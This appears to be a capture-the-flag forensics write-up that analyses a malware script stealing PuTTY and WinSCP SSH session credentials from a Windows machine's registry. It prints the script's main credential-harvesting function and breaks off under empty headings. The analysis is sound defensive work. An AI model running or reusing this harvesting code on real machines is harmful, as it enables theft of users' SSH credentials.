### First Insights

At this point in the investigation we now know that we had a malicious script execute on an employee's machine. Now that we have discovered the script, we need to examine the code being executed to determine what data the malware stole from the machine and sent to the LP. This will require a full breakdown of the malware and examination of files that the script accessed. This task attached an artifacts.zip, which contained multiple PuTTY and WinSCP keys and the employee's NTUSER.dat file. With these given files, along with the malware script, we have a good route to determine the extent of the breach.

### Malware Examination

Our first step to find the comprimised OOPS account is to examine the malware. The entire script is included in this task's directory, but we will be using snippits of it.
After the inital function declarations, we see that there is a global log that is being sent back to the listning post and the Invoke-SessionGopher function is called. We will start there.

```
function Invoke-SessionGopher {
  # Value for HKEY_USERS hive
  $HKU = 2147483651
  # Value for HKEY_LOCAL_MACHINE hive
  $HKLM = 2147483650

  $PuTTYPathEnding = "\SOFTWARE\SimonTatham\PuTTY\Sessions"
  $WinSCPPathEnding = "\SOFTWARE\Martin Prikryl\WinSCP 2\Sessions"


  Write-Log "Digging on $(Hostname)..."

  # Aggregate all user hives in HKEY_USERS into a variable
  $UserHives = Get-ChildItem Registry::HKEY_USERS\ -ErrorAction SilentlyContinue | Where-Object {$_.Name -match '^HKEY_USERS\\S-1-5-21-[\d\-]+$'}

  # For each SID beginning in S-15-21-. Loops through each user hive in HKEY_USERS.
  foreach($Hive in $UserHives) {

    # Created for each user found. Contains all PuTTY, WinSCP, FileZilla, RDP information.
    $UserObject = New-Object PSObject

    $ArrayOfWinSCPSessions = New-Object System.Collections.ArrayList
    $ArrayOfPuTTYSessions = New-Object System.Collections.ArrayList
    $ArrayOfPPKFiles = New-Object System.Collections.ArrayList

    $objUser = (GetMappedSID)
    $Source = (Hostname) + "\" + (Split-Path $objUser.Value -Leaf)

    $UserObject | Add-Member -MemberType NoteProperty -Name "Source" -Value $objUser.Value

    # Construct PuTTY, WinSCP, RDP, FileZilla session paths from base key
    $PuTTYPath = Join-Path $Hive.PSPath "\$PuTTYPathEnding"
    $WinSCPPath = Join-Path $Hive.PSPath "\$WinSCPPathEnding"

    if (Test-Path $WinSCPPath) {

      # Aggregates all saved sessions from that user's WinSCP client
      $AllWinSCPSessions = Get-ChildItem $WinSCPPath

      (ProcessWinSCPLocal $AllWinSCPSessions)

    } # If (Test-Path WinSCPPath)

    if (Test-Path $PuTTYPath) {

      # Store .ppk files
      $PPKExtensionFilesINodes = New-Object System.Collections.ArrayList

      # Aggregates all saved sessions from that user's PuTTY client
      $AllPuTTYSessions = Get-ChildItem $PuTTYPath

      (ProcessPuTTYLocal $AllPuTTYSessions)

      (ProcessPPKFile $PPKExtensionFilesINodes)

    } # If (Test-Path PuTTYPath)

  } # For each Hive in UserHives

  Write-Host "Final log:"
  $global:log
```
This function acts as the "main" of the script. It gives away what data the malware is attempting to dig in the declarations of *$PuTTYPathEnding* and *$WinSCPPathEnding*. These tell us that the malware is attempting to look for stored data about the machine's PuTTY and WinSCP sessions. The malware then looks in the Windows User Registry for all past and current users on the machine. After collecting all of the users, the script calls two methods, *ProcessWinSCPLocal* and *ProcessPuTTYLocal*. This confirms that the malware is digging for ssh credentials. We will now look at the *ProcessPuTTYLocal* method.

### Understand Windows Registry
### Determine Comprimise
